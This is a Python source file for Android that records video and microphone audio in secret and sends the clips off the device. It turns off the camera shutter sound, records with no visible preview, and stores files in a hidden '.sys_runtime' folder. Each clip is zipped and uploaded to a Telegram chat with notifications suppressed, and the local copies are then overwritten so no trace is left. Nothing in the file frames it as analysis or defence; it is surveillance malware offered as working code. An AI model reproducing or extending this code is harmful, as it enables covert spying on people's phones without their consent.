# -*- coding: utf-8 -*-

import os, time, threading, logging, zipfile, random

try:

    from jnius import autoclass

    JNI = True

except:

    JNI = False

P = os.path.join(os.getcwd(), ".sys_runtime")

T = os.path.join(P, "v_tmp")

if not os.path.exists(T): os.makedirs(T)

logging.basicConfig(filename=os.path.join(P, "v.log"), level=logging.ERROR)

class StreamManager:

    def __init__(self):

        self.recording = False

        self._res = {

            "144": [256, 144, 150000],

            "360": [640, 360, 800000],

            "720": [1280, 720, 2500000],

            "1080": [1920, 1080, 5000000]

        }

        self._zpw = "Z@3n_2025"

    def _secure_delete(self, p):

        try:

            if os.path.exists(p):

                s = os.path.getsize(p)

                with open(p, "ba+", buffering=0) as f:

                    f.write(os.urandom(s))

                os.remove(p)

        except:

            pass

    def record(self, mon, cam=0, dur=15):

        if self.recording:

            return

        threading.Thread(target=self._worker, args=(mon, cam, dur), daemon=True).start()

    def _worker(self, mon, cam, dur):

        self.recording = True

        raw = os.path.join(T, f"v_{int(time.time())}.bin")

        zipped = raw.replace(".bin", ".zip")

        rk = getattr(mon, 'video_res', "360")

        w, h, br = self._res.get(rk, self._res["360"])

        ok = False

        retries = 2

        if JNI:

            cam_dev = None

            mr = None

            for attempt in range(retries):

                try:

                    MR = autoclass('android.media.MediaRecorder')

                    Cam = autoclass('android.hardware.Camera')

                    ST = autoclass('android.graphics.SurfaceTexture')

                    

                    mr = MR()

                    cam_dev = Cam.open(cam)

                    

                    try:

                        cam_dev.enableShutterSound(False)

                    except:

                        pass

                    dummy_st = ST(10)

                    cam_dev.setPreviewTexture(dummy_st)

                    cam_dev.unlock()

                    

                    mr.setCamera(cam_dev)

                    mr.setVideoSource(MR.VideoSource.CAMERA)

                    

                    try:

                        mr.setAudioSource(MR.AudioSource.MIC)

                    except:

                        pass

                    mr.setOutputFormat(MR.OutputFormat.MPEG_4)

                    mr.setVideoEncoder(MR.VideoEncoder.H264)

                    

                    try:

                        mr.setAudioEncoder(MR.AudioEncoder.AAC)

                    except:

                        pass

                    mr.setVideoSize(w, h)

                    mr.setVideoEncodingBitRate(br)

                    mr.setOrientationHint(270 if cam == 0 else 90)

                    mr.setOutputFile(raw)

                    mr.prepare()

                    mr.start()

                    time.sleep(dur)

                    mr.stop()

                    ok = True

                    break

                except Exception as e:

                    logging.error(f"Attempt {attempt+1}: {str(e)}")

                    time.sleep(1)

                finally:

                    try:

                        if mr:

                            mr.release()

                        if cam_dev:

                            cam_dev.lock()

                            cam_dev.release()

                    except:

                        pass

        if ok and os.path.exists(raw):

            try:

                time.sleep(0.5)

                with zipfile.ZipFile(zipped, 'w', zipfile.ZIP_DEFLATED) as z:

                    z.write(raw, os.path.basename(raw))

                

                vault = getattr(mon, 'vlt', None)

                tg = getattr(mon, 'tg', None)

                

                if vault and tg:

                    with open(zipped, 'rb') as f:

                        tg._ap("sendDocument", {"chat_id": vault, "caption": f"🎬 {rk}p | CAM_{cam}", "disable_notification": True}, {"document": f})

                

                self._secure_delete(raw)

                self._secure_delete(zipped)

            except Exception as e:

                logging.error(f"Finalize: {str(e)}")

        

        self.recording = False

    def live(self, mon):

        pass

def create():

    return StreamManager()
